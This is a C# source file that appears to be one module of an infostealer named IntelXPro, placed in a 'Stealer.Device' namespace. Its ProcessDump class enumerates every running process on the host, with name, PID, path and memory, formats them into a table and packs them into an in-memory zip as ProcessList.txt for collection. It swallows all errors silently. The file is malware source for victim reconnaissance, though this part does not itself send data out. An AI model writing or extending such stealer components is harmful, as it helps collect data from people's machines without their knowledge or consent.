using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Device
{
    internal class ProcessDump : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                List<ProcessWindows.ProcInfo> list = ProcessWindows.GetProcInfos().ToList();
                if (list.Count == 0)
                {
                    return;
                }
                int totalWidth = Math.Max("Name".Length, list.Max((ProcessWindows.ProcInfo p) => p.Name?.Length ?? 0));
                int totalWidth2 = Math.Max("PID".Length, list.Max((ProcessWindows.ProcInfo p) => p.Pid?.Length ?? 0));
                int totalWidth3 = Math.Max("Path".Length, list.Max((ProcessWindows.ProcInfo p) => p.Path?.Length ?? 0));
                int totalWidth4 = Math.Max("Mem".Length, list.Max((ProcessWindows.ProcInfo p) => p.Memory?.Length ?? 0));
                string text = "Name".PadRight(totalWidth) + " | " + "PID".PadRight(totalWidth2) + " | " + "Path".PadRight(totalWidth3) + " | " + "Mem".PadRight(totalWidth4);
                string value = new string('-', text.Length);
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.AppendLine(text);
                stringBuilder.AppendLine(value);
                int result;
                foreach (ProcessWindows.ProcInfo item in from x in list
                                                         orderby x.Name ?? string.Empty, int.TryParse(x.Pid, out result) ? result : int.MaxValue
                                                         select x)
                {
                    stringBuilder.AppendLine((item.Name ?? "Unknown").PadRight(totalWidth) + " | " + (item.Pid ?? "Unknown").PadRight(totalWidth2) + " | " + (item.Path ?? "Unknown").PadRight(totalWidth3) + " | " + (item.Memory ?? "Unknown").PadRight(totalWidth4));
                }
                zip.AddTextFile("ProcessList.txt", stringBuilder.ToString());
            }
            catch
            {
            }
        }
    }

}
